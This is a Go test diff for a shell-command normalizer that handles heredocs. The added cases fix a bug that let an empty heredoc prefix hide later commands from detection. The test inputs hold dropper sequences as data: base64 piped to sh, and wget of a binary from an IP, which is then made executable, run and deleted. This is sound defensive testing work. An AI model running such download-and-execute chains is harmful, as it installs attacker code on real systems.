@@ -128,6 +128,14 @@ func TestHeredocAndWrappers(t *testing.T) {
 		{"base64 -d <<< \"Zm9v\" | sh\ncd /tmp\nwget http://1.2.3.4/x\nchmod +x x\n./x\nrm x", `base64 -d <<< <tok> | sh ; cd /tmp ; wget <url> ; chmod +x x ; ./x ; rm x`},
 		// Heredoc terminator must be exact line match, not just prefix
 		{"cat <<EOF\nbody\nEOF trailing\nwget http://x/y\nEOF\nid", `cat << <heredoc> ; id`},
+		// An empty body: the newline after the delimiter word is itself the
+		// first terminator line. Consuming it before the terminator check made
+		// this heredoc swallow every later command, so any dropper prefixed
+		// with `cat <<EOF\nEOF\n` collapsed to one non-distinctive command.
+		{"cat <<EOF\nEOF\nid\nwget http://x/y", `cat << <heredoc> ; id ; wget <url>`},
+		// A quoted delimiter line is not the terminator: bash compares the
+		// raw line, so `"EOF"` must not end the body early.
+		{"cat <<EOF\nbody\n\"EOF\"\nid\nEOF\nwget http://x/y", `cat << <heredoc> ; wget <url>`},
 	} {
 		if got := norm(tc.in); got != tc.want {
 			t.Errorf("NormalizeCommand(%q)\n got %q\nwant %q", tc.in, got, tc.want)
